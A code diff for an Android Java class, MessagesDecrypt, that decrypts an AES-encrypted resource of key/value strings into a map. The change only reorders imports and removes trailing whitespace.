@@ -1,5 +1,12 @@
 package com.android.syssetup;
 
+import android.content.Context;
+
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.ByteArray;
+import com.android.syssetup.util.Check;
+import com.android.syssetup.util.Utils;
+
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -13,20 +20,13 @@ import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
-import android.content.Context;
-
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.ByteArray;
-import com.android.syssetup.util.Check;
-import com.android.syssetup.util.Utils;
-
 public class MessagesDecrypt {
 	private static final String TAG = "MessageDecrypt";
 
 	final HashMap<String, String> messages = new HashMap<String, String>();
 
 	String pack = Status.self().getAppContext().getPackageName();
-	
+
 	public MessagesDecrypt(Context context) {
 
 		if (Cfg.DEBUG) {
@@ -58,7 +58,7 @@ public class MessagesDecrypt {
 			final IvParameterSpec ivSpec = new IvParameterSpec(iv);
 
 			cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
-			
+
 			final CipherInputStream cis = new CipherInputStream(stream, cipher);
 			final BufferedReader br = new BufferedReader(new InputStreamReader(cis));
 
@@ -73,7 +73,7 @@ public class MessagesDecrypt {
 					Check.asserts(kv.length == 2, "wrong number of tokens"); //$NON-NLS-1$
 					//Check.log(TAG + " " + kv[0] + " " + kv[1]); //$NON-NLS-1$ //$NON-NLS-2$
 				}
-				
+
 				String value = kv[1].replace("$PACK$", pack);
 				messages.put(kv[0], value);
 
@@ -81,7 +81,7 @@ public class MessagesDecrypt {
 					Check.asserts(messages.containsKey(kv[0]), "strange hashmap behaviour"); //$NON-NLS-1$
 				}
 			}
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (MessagesDecrypt), messages.size: " + messages.size());
 			}
